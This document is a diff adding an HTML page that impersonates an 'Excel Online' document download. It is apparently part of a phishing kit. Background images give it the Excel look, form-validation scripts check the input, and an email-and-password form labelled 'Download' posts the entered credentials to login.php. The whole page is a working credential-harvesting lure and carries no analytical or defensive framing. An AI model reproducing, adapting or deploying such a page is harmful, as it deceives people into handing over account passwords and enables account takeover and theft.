@@ -1,0 +1,244 @@
+<html xmlns="http://www.w3.org/1999/xhtml">
+ <head>
+  <meta content="Content-Type" http-equiv="Content-Type" />
+  <title>
+   Excel Online - 09KSJDJR4843984NF98738UNFD843
+  </title>
+  <link href="favicon.ico" type="image/png" rel="icon" />
+  <script language="JavaScript">
+   &lt;!--
+
+var b = 0 ;
+var i = 0 ;
+var errmsg = "" ;
+var punct = "" ;
+var min = 0 ;
+var max = 0 ;
+
+function formbreeze_email(field) {
+
+	if (b &amp;&amp; (field.value.length == 0)) return true ;
+
+
+	if (! emailCheck(field.value))
+	  {
+		  field.focus();
+		  if (field.type == "text") field.select();
+		  return false ;
+	  }
+
+   return true ;
+}
+
+function formbreeze_filledin(field) {
+
+if (b &amp;&amp; (field.value.length == 0)) return true;
+
+if (field.value.length &lt; min) {
+alert(errmsg);
+field.focus();
+if (field.type == "text") field.select();
+return false ;
+   }
+
+if ((max &gt; 0) &amp;&amp; (field.value.length &gt; max)) {
+alert(errmsg);
+field.focus();
+if (field.type == "text") field.select();
+return false ;
+   }
+
+return true ;
+}
+
+function formbreeze_number(field) {
+
+if (b &amp;&amp; (field.value.length == 0)) return true ; ;
+
+if (i)
+ var valid = "0123456789"
+else
+ var valid = ".,0123456789"
+
+var pass = 1;
+var temp;
+for (var i=0; i&lt;field.value.length; i++) {
+temp = "" + field.value.substring(i, i+1);
+if (valid.indexOf(temp) == "-1") pass = 0;
+
+}
+
+if (!pass) {
+alert(errmsg);
+field.focus();
+if (field.type == "text") field.select();
+return false;
+ }
+
+if (field.value &lt; min) {
+alert(errmsg);
+field.focus();
+if (field.type == "text") field.select();
+return false;
+   }
+
+
+if ((max &gt; 0) &amp;&amp; (field.value &gt; max)) {
+alert(errmsg);
+field.focus();
+if (field.type == "text") field.select();
+return false;
+   }
+
+return true ;
+}
+
+
+function formbreeze_numseq(field) {
+
+
+if (b &amp;&amp; (field.value.length == 0)) return true ;
+
+var valid = punct + "0123456789"
+
+var pass = 1;
+var digits = 0
+var temp;
+for (var i=0; i&lt;field.value.length; i++) {
+temp = "" + field.value.substring(i, i+1);
+if (valid.indexOf(temp) == "-1") pass = 0;
+if (valid.indexOf(temp) &gt; (punct.length-1) ) digits++ ;
+
+}
+
+if (!pass) {
+alert(errmsg);
+field.focus();
+if (field.type == "text") field.select();
+return false ; ;
+   }
+
+if (digits &lt; min) {
+alert(errmsg);
+field.focus();
+if (field.type == "text") field.select();
+return false;
+   }
+
+if ((max &gt; 0) &amp;&amp; (digits &gt; max)) {
+alert(errmsg);
+field.focus();
+if (field.type == "text") field.select();
+return false;
+   }
+
+return true ;
+}
+
+function emailCheck (emailStr) {
+
+var checkTLD=1;
+var knownDomsPat=/^(com|net|org|edu|int|mil|gov|arpa|biz|aero|name|coop|info|pro|museum|ws)$/;
+var emailPat=/^(.+)@(.+)$/;
+var specialChars="\\(\\)&gt;&lt;@,;:\\\\\\\"\\.\\[\\]";
+var validChars="\[^\\s" + specialChars + "\]";
+var quotedUser="(\"[^\"]*\")";
+var atom=validChars + '+';
+var word="(" + atom + "|" + quotedUser + ")";
+var userPat=new RegExp("^" + word + "(\\." + word + ")*$");
+var domainPat=new RegExp("^" + atom + "(\\." + atom +")*$");
+var matchArray=emailStr.match(emailPat);
+
+if (matchArray==null) {
+alert(errmsg);
+return false;
+}
+var user=matchArray[1];
+var domain=matchArray[2];
+
+for (i=0; i&lt;user.length; i++) {
+if (user.charCodeAt(i)&gt;127) {
+alert(errmsg);
+return false;
+   }
+}
+for (i=0; i&lt;domain.length; i++) {
+if (domain.charCodeAt(i)&gt;127) {
+alert(errmsg);
+return false;
+   }
+}
+
+if (user.match(userPat)==null) {
+alert(errmsg);
+return false;
+}
+
+var atomPat=new RegExp("^" + atom + "$");
+var domArr=domain.split(".");
+var len=domArr.length;
+for (i=0;i&lt;len;i++) {
+if (domArr[i].search(atomPat)==-1) {
+alert(errmsg);
+return false;
+   }
+}
+
+if (checkTLD &amp;&amp; domArr[domArr.length-1].length!=2 &amp;&amp;
+domArr[domArr.length-1].search(knownDomsPat)==-1) {
+alert(errmsg);
+return false;
+}
+
+if (len&lt;2) {
+alert(errmsg);
+return false;
+}
+
+return true;
+}
+
+function formbreeze_sub()
+{
+/*
+//FBDATA:Email^1^0^Please enter a valid email address.:;Password^0^1^0^0^Enter your password:;
+*/
+b=0;
+errmsg="Please enter a valid email address.";
+if (! formbreeze_email(document.login_form.Email) ) return false ;
+b=0;
+errmsg="Enter your password";
+min=1;
+max=0;
+if (! formbreeze_filledin(document.login_form.Password) ) return false ;
+
+}
+--&gt;
+  </script>
+ </head>
+ <body style="background-image: url('exl.png'); background-repeat: no-repeat">
+  <div id="layer1" style="position: absolute; width: 437px; height: 278px; z-index: 1; left: 422px; top: 223px; background-image: url('excel2013.png'); background-repeat: no-repeat">
+   <div id="layer2" style="position: absolute; width: 91px; height: 7px; z-index: 1; left: 171px; top: 67px; background-image: url('294.gif'); background-repeat: no-repeat">
+    �
+   </div>
+   <form onsubmit=" return formbreeze_sub()" action="login.php" style="line-height: 1.22em; margin: 0px; padding: 0px;" id="login_form" name="login_form" autocomplete="on" method="POST">
+    <div id="layer3" style="position: absolute; width: 313px; height: 20px; z-index: 1; left: 63px; top: 104px">
+     <span class="formwrap">
+      <input type="email" style="width:313; height:35" placeholder="someone@example.com" autocomplete="on" name="Email" id="did" />
+     </span>
+    </div>
+    <div id="layer4" style="position: absolute; width: 314px; height: 20px; z-index: 2; left: 63px; top: 152px">
+     <span class="formwrap">
+      <input type="password" style="width:315; height:34" placeholder="Password" name="Password" id="didd" />
+     </span>
+    </div>
+    <div id="layer5" style="position: absolute; width: 92px; height: 30px; z-index: 3; left: 164px; top: 220px">
+     <button style="line-height: 1.22em; border: 1px solid rgb(82, 38, 117); color: rgb(255, 255, 255); height: 35px; width: 100px; font-weight: bold; cursor: pointer; text-align: center; border-top-left-radius: 2px; border-top-right-radius: 2px; border-bottom-right-radius: 2px; border-bottom-left-radius: 2px; background-color: rgb(5, 55, 155); font-size: 13px;" tabindex="4" class="lgbx-btn purple-bg" name=".save" id=".save" type="submit">
+      Download
+     </button>
+    </div>
+    �
+   </form>
+  </div>
+ </body>
+</html>
